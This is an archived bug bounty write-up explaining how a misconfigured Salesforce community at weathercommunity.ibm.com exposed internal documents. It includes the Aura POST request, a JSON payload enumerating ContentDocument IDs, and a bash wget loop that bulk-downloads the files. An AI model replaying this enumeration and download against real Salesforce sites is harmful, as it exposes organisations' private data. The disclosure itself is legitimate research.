---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-05-19_alternative-link.md
original_filename: 2022-05-19_alternative-link.md
title: Alternative link
category: documents
detected_topics:
- sso
- saml
- idor
- xss
- command-injection
- otp
tags:
- imported
- documents
- sso
- saml
- idor
- xss
- command-injection
- otp
language: en
raw_sha256: a40786d3eb7933fc1f4b23fa9f0b662f26d61cebd4260347d5a527247dbab409
text_sha256: 37798f0b0ea934f23c9a718f32ea709a7929cd9ce5d4f931f31747ce0c167a48
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: false
---

# Alternative link

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-05-19_alternative-link.md
- Source Type: markdown
- Detected Topics: sso, saml, idor, xss, command-injection, otp
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: False
- Raw SHA256: `a40786d3eb7933fc1f4b23fa9f0b662f26d61cebd4260347d5a527247dbab409`
- Text SHA256: `37798f0b0ea934f23c9a718f32ea709a7929cd9ce5d4f931f31747ce0c167a48`


## Content

---
title: "Alternative link"
page_title: "How I was able to access IBM internal documents - MoTaha"
url: "https://motaha22.github.io/bugbounty/ibm-bounty/"
final_url: "https://motaha22.github.io/bugbounty/ibm-bounty/"
authors: ["Mohamed Taha (@Mohamed12742780)"]
programs: ["IBM"]
bugs: ["Information disclosure", "IDOR"]
publication_date: "2022-05-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2628
---

# How I was able to access IBM internal documents 

__1 minute read

#### __On this page

Hi, today I will share how I was able to access internal data of https://weathercommunity.ibm.com using salesforce misconfiguration.

This write-up will depends n this great blog: [ Salesforce](https://web.archive.org/web/20210125200757/https://www.enumerated.de/salesforce)

so please read it first then read this write-up.

After I read this blog, I wanted to exploit it in the wild so I now I wanted to see the subdomains which point to on of the following CNAMEs:

*.force.com

*.secure.force.com

*live.siteforce.com

I used this great tool https://github.com/yghonem14/cngo to get CNMAEs of all the websites that have program on hackerone through https://chaos.projectdiscovery.io/

I found this subdomain **weathercommunity.ibm.com** which pointing out to: **thercommunity.ibm.com.00de0000000avgcma2.live.siteforce.com**

I found an endpoint like:
  
  
  POST /s/sfsites/aura?r=2&applauncher.CommunityLogo.getCommunityName=1&applauncher.CommunityLogo.getLogoURL=1&applauncher.EmployeeLoginLink.getEmployeeLoginUrl=1&applauncher.EmployeeLoginLink.getIsAllowInternalUserLoginEnabled=1&applauncher.SocialLogin.getAuthProviders=1&applauncher.SocialLogin.getSamlProviders=1&applauncher.SocialLogin.handleIdp=1&other.LightningLoginForm.getForgotPasswordUrl=1&other.LightningLoginForm.getIsSelfRegistrationEnabled=1&other.LightningLoginForm.getIsUsernamePasswordEnabled=1&other.LightningLoginForm.getSelfRegistrationUrl=1&ui-communities-components-aura-components-forceCommunity-richText.RichText.getParsedRichTextValue=2&ui-communities-components-aura-components-forceCommunity-seoAssistant.SeoAssistant.getSeoLanguageData=1 HTTP/1.1
  

![](/assets/images/crackme/0690h000007Aly3AAC.png)

then I sent this POST request to the Repeater and changed the **_Message_** parameter value to:
  
  
  {"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"MARKER","layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}
  
  

Replacing the **_MARKER_** string with:

**_ContentDocument_**

![](/assets/images/crackmes/ibm1.png)

See that there are more than 900 ID. I extracted the ID value which started with 069 and made a simple bash script to download them one by one through this endpoint /sfc/servlet.shepherd/document/download/$ID

https://weathercommunity.ibm.com/sfc/servlet.shepherd/document/download/ID

Example:

https://weathercommunity.ibm.com/sfc/servlet.shepherd/document/download/0690h0000060wuHAAQ
  
  
  while read i
  do wget --no-check-certificate "https://weathercommunity.ibm.com/sfc/servlet.shepherd/document/download/$i"
  done < $1
  
  

Sample of the internal images:

![]()

![](/assets/images/crackmes/0690h000007Aly3AAC.png)

***Final word:** you will not understand anything if you did not read the blog [ Salesforce](https://web.archive.org/web/20210125200757/https://www.enumerated.de/salesforce) first as he explained everything in it.

**__Categories:** [bugbounty](/categories/#bugbounty)

**__Updated:** March 4, 2022

[Previous](/bugbounty/bounty/ "How I found XSS vulnerability in Amazon in 5 minutes using shodan
") Next
